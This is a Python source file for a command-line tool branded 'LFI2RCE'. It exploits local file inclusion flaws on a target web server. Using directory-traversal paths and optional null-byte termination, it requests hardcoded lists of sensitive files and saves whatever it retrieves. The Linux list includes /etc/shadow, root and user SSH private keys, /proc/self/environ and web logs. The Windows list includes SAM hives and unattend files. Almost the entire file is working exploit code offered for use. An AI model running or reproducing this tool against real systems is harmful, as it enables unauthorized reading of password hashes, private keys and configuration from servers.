import argparse
import requests
import urllib3
import os

class Color:
    BLACK     = '\033[30m'
    RED       = '\033[31m'
    GREEN     = '\033[32m'
    YELLOW    = '\033[33m'
    BLUE      = '\033[34m'
    PURPLE    = '\033[35m'
    CYAN      = '\033[36m'
    WHITE     = '\033[37m'
    END       = '\033[0m'
    BOLD      = '\033[1m'
    UNDERLINE = '\033[4m'
    INVISIBLE = '\033[08m'
    REVERCE   = '\033[07m'

def save_file_at_new_dir(new_dir_path, new_filename, new_file_content, mode='w'):
    if not os.path.exists(new_dir_path):
        os.makedirs(new_dir_path)
    with open(os.path.join(new_dir_path, new_filename), mode) as f:
        f.write(new_file_content)

print(Color.CYAN + "                    _     _____ ___ ____  ____   ____ _____  " + Color.END)
print(Color.CYAN + "                   | |   |  ___|_ _|___ \|  _ \ / ___| ____| " + Color.END)
print(Color.CYAN + "                   | |   | |_   | |  __) | |_) | |   |  _|   " + Color.END)
print(Color.CYAN + "                   | |___|  _|  | | / __/|  _ <| |___| |___  " + Color.END)
print(Color.CYAN + "                   |_____|_|   |___|_____|_| \_\\____|_____| " + Color.END)

parser = argparse.ArgumentParser(description='brute force common file')
parser.add_argument('host', type=str, help='IP address to scan. Example: 127.0.0.1')
parser.add_argument('path', type=str, help='Local file inclusion path. Example: /browser.php?file=/../../../../..')
parser.add_argument('--nullbyte', action='store_true', default=False, help='terminate the url with null byte')
parser.add_argument('--ssl', action='store_true', default=False, help='Use SSL for connection (https)')
parser.add_argument('--dir-file', type=str, default=None, help='Input file for directory brute force')
parser.add_argument('--windows', action='store_true', default=False, help='Windows server')
parser.add_argument('--linux', action='store_true', default=False, help='linux server')
parser.add_argument('--username', type=str, default=None, help='enter username if you know.')
parser.add_argument('--debug', action='store_true', default=False, help='Complete setup without running against host')
parser.add_argument('--error', type=str, default='', help='Enter Error Messgage. Example: \"No such file or directory\" \"failed to open stream\"')
parser.add_argument('-p', '--port', type=str, default=None, help='Target port. Default: http 80 https 443')
parser.add_argument('-v', '--verbose', action='store_true', default=False, help='Verbose output')
parser.add_argument('-k', '--verify-ssl', action='store_true', default=False, help='Verify SSL certificates')
parser.add_argument('-o', '--outdir', type=str, default=None, help="Write output to this directory")
parser.add_argument('-s', '--show-output', action='store_true', default=False, help="show results to screen")

args = parser.parse_args()
ssl = args.ssl
verify_ssl = args.verify_ssl
if not verify_ssl:
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

prefix = "https://" if ssl else "http://"
suffix = "%00" if args.nullbyte else ""
base_path = args.path
host = args.host
if args.port:
    host = host + ":" + args.port
    print(host)
lfi_path_example = Color.YELLOW + "{}{}{}<INJECTION POINT>{}".format(prefix, host, base_path, suffix)+ Color.END

verbose = args.verbose
debug = args.debug
show = args.show_output
username = args.username
outdir = args.outdir
errormes = args.error
file_found = []
if verbose:
    print(Color.GREEN+"SSL Enabled: %s" % ssl + Color.END)
    print(Color.GREEN+"Verify SSL: %s" % verify_ssl + Color.END)
    print(Color.GREEN+"Host: %s" % host + Color.END)
    print(Color.GREEN+"Base Injection Path: %s" % base_path + Color.END)
    print(Color.GREEN+"Terminator: %s" % suffix + Color.END)
    print(Color.GREEN+"LFI path: %s" % lfi_path_example + Color.END)
    print(Color.GREEN+"Error Message: %s" % errormes + Color.END)
LINUX_FILES = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/issue",
    "/etc/group",
    "/etc/hostname",
    "/etc/ssh/ssh_config",
    "/etc/ssh/sshd_config",
    "/root/.ssh/id_rsa",
    "/root/.ssh/authorized_keys",
    # bruteforce /home/username
    "/home/{}/.ssh/authorized_keys".format(username),
    "/home/{}/.ssh/id_rsa".format(username),

    "/etc/apache2/apache2.conf",
    "/usr/local/etc/apache2/httpd.conf",
    "/etc/httpd/conf/httpd.conf",
    "/var/log/httpd/access_log",
    "/var/log/apache2/access.log",
    "/var/log/httpd-access.log",
    "/var/log/apache/access.log",
    "/var/log/apache/error.log",
    "/var/log/apache2/access.log",
    "/var/log/apache/error.log",
    "/var/lib/mysql/mysql/usr.frm",
    "/var/lib/mysql/user.MYD",
    "/var/lib/mysql/user.MYI",
    "/var/log/apache/logs/error.log",
    "/var/log/apache/logs/access.log",
    "/etc/httpd/logs/acces_log",
    "/etc/httpd/logs/acces.log",
    "/etc/httpd/logs/error_log",
    "/etc/httpd/logs/error.log",
    "/var/www/logs/access_log",
    "/var/www/logs/access.log",
    "/usr/local/apache/logs/access_log",
    "/usr/local/apache/logs/access.log",
    "/var/www/logs/error_log",
    "/var/www/logs/error.log",
    "/var/log/access_log",
    "/var/log/access.log",
    "/usr/local/apache/logs/error_log",
    "/usr/local/apache/logs/error.log",
    "/var/log/apache/error_log",
    "/var/log/apache2/error_log",
    "/var/log/error_log",
    "/var/log/error.log",
    "/proc/self/environ",
    "/var/log/vsftpd.log",
    "/var/log/sshd.log",
    "/var/log/auth.log",
    "/var/mail",
    "/var/spool/mail",
    "/var/spool/mail/rpc",
    "/var/mail/rpc",
    "/var/mail/root",
    "/var/spool/mail/root",
    #/var/lib/phpX/sess_<PHPSESSID>
    "/var/mail/{}".format(username),
    "/var/spool/mail/{}".format(username)
]

WINDOWS_FILES = [
    "/boot.ini",
    "/autoexec.bat",
    "/windows/system32/drivers/etc/hosts",
    "/windows/repair/SAM"
    "/windows/panther/unattended.xml",
    "/windows/panther/unattend/unattended.xml",
    "/WINDOWS/repair/sam",
    "/WINDOWS/repair/system"
]

if args.dir_file:
    file_name = args.dir_file
    file_data = open(file_name,"r")
    files = [s.strip() for s in file_data.readlines()]
elif args.windows:
    files = WINDOWS_FILES
elif args.linux:
    files = LINUX_FILES

if verbose:
    print(Color.GREEN + "Loaded %d files" % len(files) + Color.END)

session = requests.Session()
files_processed = 0.0
for f in files:
    url = "{}{}{}{}{}".format(prefix, host, base_path, f, suffix)
    if verbose:
        percent_complete = (float(files_processed) / float(len(files))) * 100
        print("Progress: %d%%" % percent_complete)
        print(Color.YELLOW+"Testing {}".format(url)+Color.END)
    if debug:
        files_processed += 1
        continue
    resp = session.get(url, verify=verify_ssl)
    if resp.content and resp.status_code != 404:
        if errormes == '' and len(resp.content)>0:
            print(Color.RED + "LFI Success! {} file found.".format(f) + Color.END)
            file_found.append(f)
            if outdir:
                save_file_at_new_dir(outdir, f.split('/')[-1], resp.content)
        if not errormes in resp.content:
            print(Color.RED + "LFI Success! {} file found.".format(f) + Color.END)
            file_found.append(f)
            if outdir:
                save_file_at_new_dir(outdir, f.split('/')[-1], resp.content)
        if verbose and show:
            print(resp.content)
    files_processed += 1
print(Color.GREEN + "Following files found!!!" + Color.END)
for found in file_found:
    print(Color.RED + found + Color.END)
print("LFI2RCE finished!")
